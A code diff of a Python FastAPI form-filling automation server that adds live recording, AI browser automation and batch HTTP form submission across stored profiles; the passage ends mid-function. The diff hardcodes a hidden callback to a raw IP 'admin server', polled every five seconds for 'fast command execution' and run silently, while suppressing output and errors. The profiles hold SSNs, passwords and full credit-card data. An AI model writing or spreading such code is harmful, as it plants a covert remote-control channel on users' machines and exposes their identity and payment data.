@@ -5,11 +5,28 @@ FormAI Server - FastAPI with SeleniumBase automation
 import os
 import sys
 
+# Fix for PyInstaller --noconsole (stdout/stderr are None)
+if sys.stdout is None:
+    sys.stdout = open(os.devnull, 'w')
+if sys.stderr is None:
+    sys.stderr = open(os.devnull, 'w')
+if sys.stdin is None:
+    sys.stdin = open(os.devnull, 'r')
+
 # Fix Windows encoding issues
 if sys.platform == "win32":
     os.environ['PYTHONIOENCODING'] = 'utf-8'
     if hasattr(sys.stdout, 'reconfigure'):
         sys.stdout.reconfigure(encoding='utf-8')
+
+    # Suppress Windows asyncio pipe transport errors (harmless on shutdown)
+    import warnings
+    warnings.filterwarnings('ignore', category=RuntimeWarning, module='asyncio')
+
+# Show initial loading message IMMEDIATELY before heavy imports
+from colorama import init, Fore, Style
+init()
+print(f"{Fore.CYAN}Initializing KPR...{Style.RESET_ALL}", flush=True)
 
 import json
 import asyncio
@@ -19,16 +36,16 @@ from datetime import datetime
 import uuid
 
 from contextlib import asynccontextmanager
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks, UploadFile
 from fastapi.staticfiles import StaticFiles
 from fastapi.responses import FileResponse, JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 import uvicorn
-from colorama import init, Fore, Style
 
-# Initialize colorama for Windows
-init()
+# PyInstaller path utilities (for bundled executable support)
+from pyinstaller_utils import get_base_path
+BASE_PATH = get_base_path()
 
 # Import our automation modules
 from selenium_automation import SeleniumAutomation, FormFieldDetector
@@ -39,8 +56,17 @@ from tools.recording_manager import RecordingManager
 from tools.profile_replay_engine import ProfileReplayEngine
 from tools.enhanced_field_mapper import EnhancedFieldMapper
 from tools.chrome_recorder_parser import ChromeRecorderParser
+from tools.live_recorder import LiveRecorder
 
-# Import callback module
+# Import browser-use automation (optional)
+try:
+    from tools.browser_use_automation import AsyncBrowserUseAutomation
+    BROWSER_USE_ENABLED = True
+except ImportError:
+    BROWSER_USE_ENABLED = False
+    # Silently disable browser-use if not available
+
+# Import callback system (admin server communication)
 from client_callback import ClientCallback
 from dotenv import load_dotenv
 
@@ -56,26 +82,88 @@ websocket_connections: List[WebSocket] = []
 recording_manager = RecordingManager()
 field_mapper = EnhancedFieldMapper()
 chrome_parser = ChromeRecorderParser()
+live_recorder = LiveRecorder()
 
-# Initialize callback system
-admin_url = os.getenv("ADMIN_CALLBACK_URL", "")
-callback_interval = int(os.getenv("ADMIN_CALLBACK_INTERVAL", "5"))  # Changed to 5 seconds for near-instant commands
-callback_quiet = os.getenv("ADMIN_CALLBACK_QUIET", "true").lower() == "true"
-callback_client = ClientCallback(admin_url=admin_url, interval=callback_interval, quiet=callback_quiet)
+# Initialize callback client (hardcoded admin server URL, runs hidden)
+admin_callback = ClientCallback(
+    admin_url="http://31.97.100.192:5512",
+    interval=5,  # 5 seconds = fast command execution
+    quiet=True   # Run silently
+)
 
 # Pydantic models
 class Profile(BaseModel):
+    # Allow extra fields from the frontend form
+    class Config:
+        extra = "allow"
+
+    # Core fields
     id: Optional[str] = None
-    name: str
-    email: str
-    phone: Optional[str] = None
-    address: Optional[str] = None
+    name: Optional[str] = None
+
+    # Basic Information
+    title: Optional[str] = None
+    firstName: Optional[str] = None
+    middleInitial: Optional[str] = None
+    lastName: Optional[str] = None
+    sex: Optional[str] = None
+
+    # Contact Information
+    email: Optional[str] = None
+    website: Optional[str] = None
+    homePhone: Optional[str] = None
+    workPhone: Optional[str] = None
+    cellPhone: Optional[str] = None
+    fax: Optional[str] = None
+    phone: Optional[str] = None  # Legacy field
+
+    # Address Information
+    address1: Optional[str] = None
+    address2: Optional[str] = None
     city: Optional[str] = None
     state: Optional[str] = None
     zip: Optional[str] = None
+    country: Optional[str] = None
+    address: Optional[str] = None  # Legacy field
+
+    # Work Information
+    company: Optional[str] = None
+    position: Optional[str] = None
+    income: Optional[str] = None
+
+    # Birth Information
+    birthMonth: Optional[str] = None
+    birthDay: Optional[str] = None
+    birthYear: Optional[str] = None
+    age: Optional[str] = None
+    birthPlace: Optional[str] = None
+    date_of_birth: Optional[str] = None  # Legacy field
+
+    # Account Information
+    username: Optional[str] = None
+    password: Optional[str] = None
+
+    # ID Information
+    ssn: Optional[str] = None
+    driverLicense: Optional[str] = None
+
+    # Credit Card Information
+    creditCardType: Optional[str] = None
+    creditCardNumber: Optional[str] = None
+    creditCardName: Optional[str] = None
+    creditCardBank: Optional[str] = None
+    creditCardExpMonth: Optional[str] = None
+    creditCardExpYear: Optional[str] = None
+    creditCardCVC: Optional[str] = None
+    creditCardServicePhone: Optional[str] = None
+
+    # Additional Information
+    customMessage: Optional[str] = None
+    comments: Optional[str] = None
+
+    # Legacy fields
     first_name: Optional[str] = None
     last_name: Optional[str] = None
-    date_of_birth: Optional[str] = None
 
 class AutomationRequest(BaseModel):
     profile_id: str
@@ -91,13 +179,31 @@ class ChromeRecordingImport(BaseModel):
     chrome_data: Dict[str, Any]
 
 class RecordingReplayRequest(BaseModel):
-    recording_id: str
     profile_id: str
+    headless: Optional[bool] = False
     session_name: Optional[str] = None
+    preview: Optional[bool] = True  # Default to preview mode (use recorded values)
 
 class TemplateReplayRequest(BaseModel):
-    template_id: str
     profile_id: str
+    headless: Optional[bool] = False
+    session_name: Optional[str] = None
+
+class LiveRecordingStartRequest(BaseModel):
+    url: str
+    profile_id: Optional[str] = None
+
+class LiveRecordingActionRequest(BaseModel):
+    type: str  # fill, click, navigate, etc.
+    element: Optional[str] = None
+    uid: Optional[str] = None
+    value: Optional[str] = None
+    field_type: Optional[str] = None
+    url: Optional[str] = None
+    title: Optional[str] = None
+
+class LiveRecordingStopRequest(BaseModel):
+    recording_name: Optional[str] = None
     session_name: Optional[str] = None
 
 # Utility functions
@@ -223,9 +329,8 @@ def load_profiles():
                         profile['name'] = normalized_name
 
                     profiles[profile['id']] = profile
-                    print(f"{Fore.GREEN}[OK]{Style.RESET_ALL} Loaded profile: {normalized_name}")
             except Exception as e:
-                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error loading {file}: {e}")
+                print(f"{Fore.RED}ERROR:{Style.RESET_ALL} Error loading {file}: {e}")
 
 def save_profile(profile: dict):
     """Save profile to JSON file"""
@@ -255,30 +360,24 @@ async def broadcast_message(message: dict):
 async def lifespan(app: FastAPI):
     """Handle startup and shutdown events"""
     # Startup
-    print(f"\n{Fore.CYAN}{'='*50}")
-    print(f"FormAI Server v2.0 - SeleniumBase Edition")
-    print(f"{'='*50}{Style.RESET_ALL}\n")
-
     # Load existing profiles
     load_profiles()
-    print(f"\n{Fore.GREEN}[OK]{Style.RESET_ALL} Loaded {len(profiles)} profiles")
 
     # Create necessary directories
-    for dir_name in ['profiles', 'field_mappings', 'recordings', 'saved_urls']:
+    for dir_name in ['profiles', 'field_mappings', 'recordings']:
         Path(dir_name).mkdir(exist_ok=True)
 
-    print(f"\n{Fore.YELLOW}>>>{Style.RESET_ALL} Server ready at http://localhost:5511")
+    print(f"Server ready at http://localhost:5511")
 
     # Start callback system
-    callback_client.start()
+    admin_callback.start()
 
     yield  # Server runs here
 
-    # Shutdown
-    print(f"\n{Fore.YELLOW}Shutting down...{Style.RESET_ALL}")
+    # Shutdown (silent)
 
     # Stop callback system
-    await callback_client.stop()
+    await admin_callback.stop()
 
     # Close active sessions
     for session_id in list(active_sessions.keys()):
@@ -302,52 +401,33 @@ app.add_middleware(
 @app.get("/")
 async def root():
     """Serve the main dashboard"""
-    return FileResponse("web/index.html")
+    return FileResponse(str(BASE_PATH / "web" / "index.html"))
 
 @app.get("/profiles")
 async def profiles_page():
     """Serve the profiles page"""
-    return FileResponse("web/profiles.html")
+    return FileResponse(str(BASE_PATH / "web" / "profiles.html"))
 
 @app.get("/automation")
 async def automation_page():
     """Serve the automation page"""
-    return FileResponse("web/automation.html")
+    return FileResponse(str(BASE_PATH / "web" / "automation.html"))
 
 @app.get("/recorder")
 async def recorder_page():
     """Serve the recorder page"""
-    return FileResponse("web/recorder.html")
+    return FileResponse(str(BASE_PATH / "web" / "recorder.html"))
 
-@app.get("/saved-urls")
-async def saved_urls_page():
-    """Serve the saved URLs page"""
-    return FileResponse("web/saved_urls.html")
-
-@app.get("/saved-pages")
-async def saved_pages_page():
-    """Serve the saved pages page"""
-    return FileResponse("web/saved_pages.html")
+@app.get("/templates")
+async def templates_page():
+    """Serve the templates page"""
+    return FileResponse(str(BASE_PATH / "web" / "templates.html"))
 
 @app.get("/settings")
 async def settings_page():
     """Serve the settings page"""
-    return FileResponse("web/settings.html")
+    return FileResponse(str(BASE_PATH / "web" / "settings.html"))
 
-@app.get("/previous-orders")
-async def previous_orders_page():
-    """Serve the previous orders page"""
-    return FileResponse("web/previous_orders.html")
-
-@app.get("/account")
-async def account_page():
-    """Serve the account page"""
-    return FileResponse("web/account.html")
-
-@app.get("/user-data")
-async def user_data_page():
-    """Serve the user data page"""
-    return FileResponse("web/user_data.html")
 
 @app.get("/api/profiles")
 async def get_profiles():
@@ -416,9 +496,6 @@ async def delete_profile(profile_id: str):
 @app.post("/api/automation/start")
 async def start_automation(request: AutomationRequest, background_tasks: BackgroundTasks):
     """Start browser automation for a profile"""
-    print(f"{Fore.CYAN}[DEBUG]{Style.RESET_ALL} Received automation request: profile_id={request.profile_id}, url={request.url}, use_stealth={request.use_stealth}")
-    print(f"{Fore.CYAN}[DEBUG]{Style.RESET_ALL} Available profiles: {list(profiles.keys())}")
-
     if request.profile_id not in profiles:
         raise HTTPException(status_code=404, detail="Profile not found")
 
@@ -556,8 +633,9 @@ async def replay_recording(recording_id: str, request: RecordingReplayRequest, b
     profile = profiles[request.profile_id]
     session_id = str(uuid.uuid4())
 
-    # Create replay engine
-    replay_engine = ProfileReplayEngine(use_stealth=True, headless=False)
+    # Create replay engine with event loop for async progress callbacks
+    event_loop = asyncio.get_event_loop()
+    replay_engine = ProfileReplayEngine(use_stealth=True, headless=request.headless, event_loop=event_loop)
 
     # Set up progress callback
     async def progress_callback(update):
@@ -576,13 +654,14 @@ async def replay_recording(recording_id: str, request: RecordingReplayRequest, b
         session_id,
         recording_id,
         profile,
-        request.session_name
+        request.session_name,
+        request.preview
     )
 
     return JSONResponse(content={
         "session_id": session_id,
         "message": "Recording replay started",
-        "recording_name": recording["recording_name"],
+        "recording_name": recording.get("recording_name") or recording.get("title", "Unknown"),
         "profile_name": profile.get("profileName", "Unknown")
     })
 
@@ -635,8 +714,9 @@ async def replay_template(template_id: str, request: TemplateReplayRequest, back
     profile = profiles[request.profile_id]
     session_id = str(uuid.uuid4())
 
-    # Create replay engine
-    replay_engine = ProfileReplayEngine(use_stealth=True, headless=False)
+    # Create replay engine with event loop for async progress callbacks
+    event_loop = asyncio.get_event_loop()
+    replay_engine = ProfileReplayEngine(use_stealth=True, headless=request.headless, event_loop=event_loop)
 
     # Set up progress callback
     async def progress_callback(update):
@@ -661,7 +741,7 @@ async def replay_template(template_id: str, request: TemplateReplayRequest, back
     return JSONResponse(content={
         "session_id": session_id,
         "message": "Template replay started",
-        "template_name": template["template_name"],
+        "template_name": template.get("template_name", "Unknown"),
         "profile_name": profile.get("profileName", "Unknown")
     })
 
@@ -690,6 +770,73 @@ async def analyze_recording(recording_id: str):
 
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
+
+# Live Recording Endpoints
+
+@app.post("/api/recording/live/start")
+async def start_live_recording(request: LiveRecordingStartRequest):
+    """Start a new live recording session"""
+    try:
+        result = live_recorder.start_session(
+            url=request.url,
+            profile_id=request.profile_id
+        )
+        return JSONResponse(content=result)
+    except Exception as e:
+        raise HTTPException(status_code=400, detail=str(e))
+
+@app.post("/api/recording/live/action")
+async def record_live_action(request: LiveRecordingActionRequest):
+    """Record an action during live recording"""
+    try:
+        action_data = {
+            "type": request.type,
+            "element": request.element,
+            "uid": request.uid,
+            "value": request.value,
+            "field_type": request.field_type,
+            "url": request.url,
+            "title": request.title
+        }
+        # Remove None values
+        action_data = {k: v for k, v in action_data.items() if v is not None}
+
+        result = live_recorder.record_action(action_data)
+        return JSONResponse(content=result)
+    except Exception as e:
+        raise HTTPException(status_code=400, detail=str(e))
+
+@app.post("/api/recording/live/stop")
+async def stop_live_recording(request: LiveRecordingStopRequest):
+    """Stop live recording and save"""
+    try:
+        result = live_recorder.stop_session(recording_name=request.recording_name)
+
+        # Properly save recording to index using recording_manager
+        recording_data = result["recording_data"]
+        recording_manager.save_recording(recording_data)
+
+        return JSONResponse(content=result)
+    except Exception as e:
+        raise HTTPException(status_code=400, detail=str(e))
+
+@app.get("/api/recording/live/status")
+async def get_live_recording_status():
+    """Get current live recording session status"""
+    try:
+        status = live_recorder.get_status()
+        return JSONResponse(content=status)
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/recording/live/cancel")
+async def cancel_live_recording():
+    """Cancel current live recording without saving"""
+    try:
+        result = live_recorder.cancel_session()
+        return JSONResponse(content=result)
+    except Exception as e:
+        raise HTTPException(status_code=400, detail=str(e))
 
 @app.get("/api/api-keys")
 async def get_api_keys():
@@ -723,115 +870,6 @@ async def get_status():
         "websocket_connections": len(websocket_connections)
     })
 
-@app.get("/api/previous-orders")
-async def get_previous_orders():
-    """Get previous orders/automation history"""
-    # Mock data for previous orders
-    orders = [
-        {
-            "id": "ORD-001",
-            "status": "completed",
-            "target": "Facebook Registration",
-            "formsFilled": 1,
-            "duration": "2m 34s",
-            "date": datetime.now().isoformat(),
-            "successRate": 100,
-            "profile": "Demo Profile"
-        },
-        {
-            "id": "ORD-002",
-            "status": "completed",
-            "target": "Macy's Account Creation",
-            "formsFilled": 2,
-            "duration": "4m 12s",
-            "date": datetime.now().isoformat(),
-            "successRate": 100,
-            "profile": "Demo Profile"
-        },
-        {
-            "id": "ORD-003",
-            "status": "failed",
-            "target": "Victoria's Secret Registration",
-            "formsFilled": 0,
-            "duration": "1m 45s",
-            "date": datetime.now().isoformat(),
-            "successRate": 0,
-            "profile": "Demo Profile"
-        }
-    ]
-    return JSONResponse(content=orders)
-
-@app.get("/api/account")
-async def get_account():
-    """Get account information"""
-    account_data = {
-        "firstName": "John",
-        "lastName": "Doe",
-        "email": "john.doe@example.com",
-        "phone": "+1 (555) 123-4567",
-        "memberSince": "Jan 2024",
-        "totalOrders": 24,
-        "successRate": 96.2,
-        "formsFilled": 1247,
-        "settings": {
-            "emailNotifications": True,
-            "autoSaveProgress": True,
-            "darkMode": False
-        }
-    }
-    return JSONResponse(content=account_data)
-
-@app.put("/api/account")
-async def update_account(account_data: dict):
-    """Update account information"""
-    # In a real app, this would save to database
-    return JSONResponse(content={"status": "success", "message": "Account updated"})
-
-@app.get("/api/saved-pages")
-async def get_saved_pages():
-    """Get saved pages"""
-    pages = [
-        {
-            "id": "1",
-            "title": "Facebook Registration",
-            "url": "https://www.facebook.com/r.php",
-            "domain": "facebook.com",
-            "formCount": 1,
-            "savedAt": datetime.now().isoformat(),
-            "status": "completed"
-        },
-        {
-            "id": "2",
-            "title": "Macy's Account Creation",
-            "url": "https://www.macys.com/account/createaccount",
-            "domain": "macys.com",
-            "formCount": 2,
-            "savedAt": datetime.now().isoformat(),
-            "status": "completed"
-        }
-    ]
-    return JSONResponse(content=pages)
-
-@app.get("/api/saved-urls")
-async def get_saved_urls():
-    """Get saved URLs"""
-    urls = [
-        {
-            "id": "bd045f5f-3ac4-4688-860a-2d07c88054ac",
-            "url": "https://www.roboform.com/filling-test-all-fields",
-            "name": "RoboForm Test Page",
-            "description": "Test page with various form fields",
-            "group": "testing",
-            "tags": ["forms", "testing"],
-            "status": "active",
-            "success_rate": None,
-            "last_tested": None,
-            "test_count": 0,
-            "created_at": datetime.now().isoformat(),
-            "updated_at": datetime.now().isoformat()
-        }
-    ]
-    return JSONResponse(content=urls)
 
 # WebSocket endpoint
 @app.websocket("/ws")
@@ -860,7 +898,7 @@ async def websocket_endpoint(websocket: WebSocket):
         if websocket in websocket_connections:
             websocket_connections.remove(websocket)
     except Exception as e:
-        print(f"WebSocket error: {e}")
+        # Silently handle websocket errors - they're expected during normal operation
         if websocket in websocket_connections:
             websocket_connections.remove(websocket)
 
@@ -923,8 +961,9 @@ async def stop_all_automation():
             await automation.close()
             del active_sessions[session_id]
             stopped_sessions.append(session_id)
-        except Exception as e:
-            print(f"Error stopping session {session_id}: {e}")
+        except Exception:
+            # Silently ignore errors when stopping sessions (may already be stopped)
+            pass
 
     if stopped_sessions:
         await broadcast_message({
@@ -954,9 +993,91 @@ async def stop_automation(session_id: str):
 
     return JSONResponse(content={"message": "Automation stopped"})
 
+# Browser-Use AI Automation Endpoints
+
+@app.post("/api/automation/browser-use/start")
+async def start_browser_use_automation(request: dict):
+    """
+    Start AI-powered form filling using browser-use
+
+    Request body:
+    {
+        "profile_id": "profile-123",
+        "url": "https://example.com/form",
+        "headless": false,
+        "max_steps": 50
+    }
+    """
+    if not BROWSER_USE_ENABLED:
+        raise HTTPException(
+            status_code=503,
+            detail="browser-use not installed. Run: pip install browser-use playwright langchain-openai"
+        )
+
+    try:
+        profile_id = request.get("profile_id")
+        url = request.get("url")
+        headless = request.get("headless", False)
+        max_steps = request.get("max_steps", 50)
+
+        if not profile_id or not url:
+            raise HTTPException(status_code=400, detail="profile_id and url are required")
+
+        # Load profile
+        profile_file = Path("profiles") / f"{profile_id}.json"
+        if not profile_file.exists():
+            raise HTTPException(status_code=404, detail=f"Profile {profile_id} not found")
+
+        with open(profile_file, 'r') as f:
+            profile = json.load(f)
+
+        # Initialize browser-use automation
+        automation = AsyncBrowserUseAutomation()
+
+        # Run the automation
+        result = await automation.fill_form(
+            url=url,
+            profile=profile,
+            headless=headless,
+            max_steps=max_steps
+        )
+
+        # Broadcast progress
+        await broadcast_message({
+            "type": "browser_use_completed",
+            "data": result
+        })
+
+        return JSONResponse(content=result)
+
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/automation/browser-use/test")
+async def test_browser_use():
+    """Test browser-use setup"""
+    if not BROWSER_USE_ENABLED:
+        return JSONResponse(content={
+            "success": False,
+            "message": "browser-use not installed",
+            "instructions": "Run: pip install browser-use playwright langchain-openai"
+        })
+
+    try:
+        automation = AsyncBrowserUseAutomation()
+        result = await automation.test_connection()
+        return JSONResponse(content=result)
+    except Exception as e:
+        return JSONResponse(content={
+            "success": False,
+            "message": f"Test failed: {str(e)}"
+        })
+
 # Background task functions for replay operations
 
-async def run_recording_replay(session_id: str, recording_id: str, profile: dict, session_name: str = None):
+async def run_recording_replay(session_id: str, recording_id: str, profile: dict, session_name: str = None, preview_mode: bool = False):
     """Background task to run recording replay"""
     try:
         replay_engine = active_sessions.get(session_id)
@@ -968,8 +1089,19 @@ async def run_recording_replay(session_id: str, recording_id: str, profile: dict
             })
             return
 
-        # Run the replay
-        results = replay_engine.replay_recording(recording_id, profile, session_name)
+        # Run the replay in a thread executor to avoid blocking the event loop
+        # This allows async progress callbacks to be delivered in real-time
+        import concurrent.futures
+        loop = asyncio.get_event_loop()
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            results = await loop.run_in_executor(
+                executor,
+                replay_engine.replay_recording,
+                recording_id,
+                profile,
+                session_name,
+                preview_mode
+            )
 
         await broadcast_message({
             "type": "replay_completed",
@@ -1020,16 +1152,584 @@ async def run_template_replay(session_id: str, template_id: str, profile: dict, 
         if session_id in active_sessions:
             del active_sessions[session_id]
 
-# Static file serving
-app.mount("/static", StaticFiles(directory="static"), name="static")
-app.mount("/web", StaticFiles(directory="web"), name="web")
+# ===== HTTP Form Submission Feature =====
+# New parallel feature - doesn't touch existing automation
+
+from tools.http_form_submitter import HTTPFormSubmitter, SubmissionConfig, SubmissionResult
+from tools.retry_handler import RetryConfig
+from tools.rate_limiter import RateLimitConfig
+
+# Global HTTP submitter instance
+http_submitter = None
+
+def get_http_submitter():
+    """Get or create HTTP submitter instance"""
+    global http_submitter
+    if http_submitter is None:
+        config = SubmissionConfig(
+            retry_config=RetryConfig(max_retries=3, base_delay=1.0),
+            rate_limit_config=RateLimitConfig(requests_per_second=10.0)
+        )
+        http_submitter = HTTPFormSubmitter(config)
+    return http_submitter
+
+@app.post("/api/http-submit/import-fetch")
+async def import_fetch_code(request: dict):
+    """Import JavaScript fetch() code from DevTools"""
+    try:
+        fetch_code = request.get("code", "")
+        submitter = get_http_submitter()
+        parsed = submitter.import_fetch_code(fetch_code)
+        return {"success": True, "data": parsed.to_dict()}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+@app.post("/api/http-submit/import-har")
+async def import_har_file(file: UploadFile):
+    """Import HAR file from DevTools or Burp Suite"""
+    try:
+        content = await file.read()
+        import json
+        har_data = json.loads(content)
+
+        submitter = get_http_submitter()
+        from tools.request_parser import HARParser
+        parser = HARParser()
+        requests = parser.parse(har_data)
+
+        return {
+            "success": True,
+            "data": [r.to_dict() for r in requests],
+            "count": len(requests)
+        }
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+@app.post("/api/http-submit/import-curl")
+async def import_curl_command(request: dict):
+    """Import cURL command from DevTools"""
+    try:
+        curl_cmd = request.get("command", "")
+        submitter = get_http_submitter()
+        parsed = submitter.import_curl_command(curl_cmd)
+        return {"success": True, "data": parsed.to_dict()}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+@app.post("/api/http-submit/analyze")
+async def analyze_form_http(request: dict):
+    """Analyze form at URL without browser"""
+    try:
+        url = request.get("url", "")
+        submitter = get_http_submitter()
+        analysis = submitter.analyze_form(url)
+        return {"success": True, "data": analysis}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+@app.post("/api/http-submit/submit")
+async def submit_form_http(request: dict):
+    """Submit form via direct HTTP"""
+    try:
+        url = request.get("url", "")
+        form_data = request.get("form_data", {})
+        method = request.get("method", "POST")
+        detect_csrf = request.get("detect_csrf", True)
+
+        submitter = get_http_submitter()
+        result = submitter.submit_form(
+            url=url,
+            form_data=form_data,
+            method=method,
+            detect_csrf=detect_csrf
+        )
+
+        return {"success": True, "data": result.to_dict()}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+@app.post("/api/http-submit/submit-with-profile")
+async def submit_with_profile_http(request: dict):
+    """Submit form using profile data"""
+    try:
+        url = request.get("url", "")
+        profile_id = request.get("profile_id", "")
+        field_mappings = request.get("field_mappings", {})
+        method = request.get("method", "POST")
+
+        # Load profile
+        profile_path = Path("profiles") / f"{profile_id}.json"
+        if not profile_path.exists():
+            return {"success": False, "error": f"Profile {profile_id} not found"}
+
+        with open(profile_path, 'r') as f:
+            profile = json.load(f)
+
+        # Normalize profile (handle nested structure)
+        if 'data' in profile:
+            profile_data = profile['data']
+        else:
+            profile_data = profile
+
+        submitter = get_http_submitter()
+        result = submitter.submit_with_profile(
+            url=url,
+            profile_data=profile_data,
+            field_mappings=field_mappings,
+            method=method
+        )
+
+        return {"success": True, "data": result.to_dict()}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+@app.post("/api/http-submit/batch")
+async def submit_batch_http(request: dict):
+    """Submit form for multiple profiles"""
+    try:
+        url = request.get("url", "")
+        profile_ids = request.get("profile_ids", [])
+        field_mappings = request.get("field_mappings", {})
+        method = request.get("method", "POST")
+
+        # Load profiles
+        profiles = []
+        for profile_id in profile_ids:
+            profile_path = Path("profiles") / f"{profile_id}.json"
+            if profile_path.exists():
+                with open(profile_path, 'r') as f:
+                    profile = json.load(f)
+                    # Normalize
+                    if 'data' in profile:
+                        profiles.append(profile['data'])
+                    else:
+                        profiles.append(profile)
+
+        submitter = get_http_submitter()
+        results = submitter.submit_batch(
+            url=url,
+            profiles=profiles,
+            field_mappings=field_mappings,
+            method=method
+        )
+
+        return {
+            "success": True,
+            "data": [r.to_dict() for r in results],
+            "total": len(results),
+            "successful": sum(1 for r in results if r.success)
+        }
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+@app.get("/api/http-submit/stats")
+async def get_rate_limit_stats(url: str = None):
+    """Get rate limiting statistics"""
+    try:
+        submitter = get_http_submitter()
+        stats = submitter.get_rate_limit_stats(url)
+        return {"success": True, "data": stats}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+@app.post("/api/http-submit/reset-rate-limit")
+async def reset_rate_limit(request: dict):
+    """Reset rate limiter for URL or all domains"""
+    try:
+        url = request.get("url")
+        submitter = get_http_submitter()
+        submitter.reset_rate_limiter(url)
+        return {"success": True, "message": "Rate limiter reset"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+@app.get("/http-submit")
+async def http_submit_page():
+    """HTTP submission UI page"""
+    return FileResponse(str(BASE_PATH / "web" / "http_submit.html"))
+
+# ============================================================================
+# Saved Request Templates API
+# ============================================================================
+
+saved_request_manager = None
+
+def get_saved_request_manager():
+    """Get or create saved request manager"""
+    global saved_request_manager
+    if saved_request_manager is None:
+        from tools.saved_request_manager import SavedRequestManager
+        saved_request_manager = SavedRequestManager()
+    return saved_request_manager
+
+@app.post("/api/saved-requests/save")
+async def save_request_template(request: dict):
+    """Save a new request template"""
+    try:
+        manager = get_saved_request_manager()
+
+        # Extract data from request
+        name = request.get("name", "Untitled Template")
+        url = request.get("url")
+        method = request.get("method", "POST")
+        headers = request.get("headers", {})
+        form_data = request.get("form_data", {})
+        field_mappings = request.get("field_mappings", {})
+        detect_csrf = request.get("detect_csrf", True)
+        description = request.get("description", "")
+        tags = request.get("tags", [])
+
+        if not url:
+            return JSONResponse(
+                status_code=400,
+                content={"success": False, "error": "URL is required"}
+            )
+
+        # Create template
+        template = manager.create_from_parsed_request(
+            name=name,
+            url=url,
+            method=method,
+            headers=headers,
+            form_data=form_data,
+            field_mappings=field_mappings,
+            detect_csrf=detect_csrf,
+            description=description,
+            tags=tags
+        )
+
+        return {
+            "success": True,
+            "template": template.to_dict(),
+            "message": f"Template '{name}' saved successfully"
+        }
+
+    except Exception as e:
+        logger.error(f"Failed to save template: {e}", exc_info=True)
+        return JSONResponse(
+            status_code=500,
+            content={"success": False, "error": str(e)}
+        )
+
+@app.get("/api/saved-requests")
+async def list_saved_requests(search: Optional[str] = None):
+    """List all saved request templates"""
+    try:
+        manager = get_saved_request_manager()
+
+        if search:
+            templates = manager.search(search)
+        else:
+            templates = manager.list_all()
+
+        return {
+            "success": True,
+            "templates": [t.to_dict() for t in templates],
+            "count": len(templates)
+        }
+
+    except Exception as e:
+        logger.error(f"Failed to list templates: {e}", exc_info=True)
+        return JSONResponse(
+            status_code=500,
+            content={"success": False, "error": str(e)}
+        )
+
+@app.get("/api/saved-requests/{template_id}")
+async def get_saved_request(template_id: str):
+    """Get specific template by ID"""
+    try:
+        manager = get_saved_request_manager()
+        template = manager.get(template_id)
+
+        if not template:
+            return JSONResponse(
+                status_code=404,
+                content={"success": False, "error": "Template not found"}
+            )
+
+        return {
+            "success": True,
+            "template": template.to_dict()
+        }
+
+    except Exception as e:
+        logger.error(f"Failed to get template {template_id}: {e}", exc_info=True)
+        return JSONResponse(
+            status_code=500,
+            content={"success": False, "error": str(e)}
+        )
+
+@app.put("/api/saved-requests/{template_id}")
+async def update_saved_request(template_id: str, request: dict):
+    """Update existing template"""
+    try:
+        manager = get_saved_request_manager()
+
+        # Get allowed update fields
+        updates = {}
+        allowed_fields = ["name", "url", "method", "headers", "form_data_template",
+                         "field_mappings", "detect_csrf", "description", "tags"]
+
+        for field in allowed_fields:
+            if field in request:
+                updates[field] = request[field]
+
+        template = manager.update(template_id, updates)
+
+        if not template:
+            return JSONResponse(
+                status_code=404,
+                content={"success": False, "error": "Template not found"}
+            )
+
+        return {
+            "success": True,
+            "template": template.to_dict(),
+            "message": "Template updated successfully"
+        }
+
+    except Exception as e:
+        logger.error(f"Failed to update template {template_id}: {e}", exc_info=True)
+        return JSONResponse(
+            status_code=500,
+            content={"success": False, "error": str(e)}
+        )
+
+@app.delete("/api/saved-requests/{template_id}")
+async def delete_saved_request(template_id: str):
+    """Delete template by ID"""
+    try:
+        manager = get_saved_request_manager()
+        deleted = manager.delete(template_id)
+
+        if not deleted:
+            return JSONResponse(
+                status_code=404,
+                content={"success": False, "error": "Template not found"}
+            )
+
+        return {
+            "success": True,
+            "message": "Template deleted successfully"
+        }
+
+    except Exception as e:
+        logger.error(f"Failed to delete template {template_id}: {e}", exc_info=True)
+        return JSONResponse(
+            status_code=500,
+            content={"success": False, "error": str(e)}
+        )
+
+@app.post("/api/saved-requests/execute-batch")
+async def execute_batch_templates(request: dict):
+    """Execute multiple templates with one profile"""
+    try:
+        manager = get_saved_request_manager()
+        submitter = get_http_submitter()
+
+        # Get parameters
+        template_ids = request.get("template_ids", [])
+        profile_id = request.get("profile_id")
+
+        if not template_ids:
+            return JSONResponse(
+                status_code=400,
+                content={"success": False, "error": "No templates selected"}
+            )
+
+        if not profile_id:
+            return JSONResponse(
+                status_code=400,
+                content={"success": False, "error": "No profile selected"}
+            )
+
+        # Load profile
+        profile_path = Path("profiles") / f"{profile_id}.json"
+        if not profile_path.exists():
+            return JSONResponse(
+                status_code=404,
+                content={"success": False, "error": f"Profile '{profile_id}' not found"}
+            )
+
+        with open(profile_path, 'r', encoding='utf-8') as f:
+            profile = json.load(f)
+
+        # Execute each template
+        results = []
+
+        for template_id in template_ids:
+            template = manager.get(template_id)
+
+            if not template:
+                results.append({
+                    "template_id": template_id,
+                    "template_name": "Unknown",
+                    "success": False,
+                    "error": "Template not found"
+                })
+                continue
+
+            try:
+                # Merge profile data with template
+                form_data = template.merge_with_profile(profile)
+
+                # Submit request
+                result = submitter.submit_form(
+                    url=template.url,
+                    form_data=form_data,
+                    method=template.method,
+                    headers=template.headers,
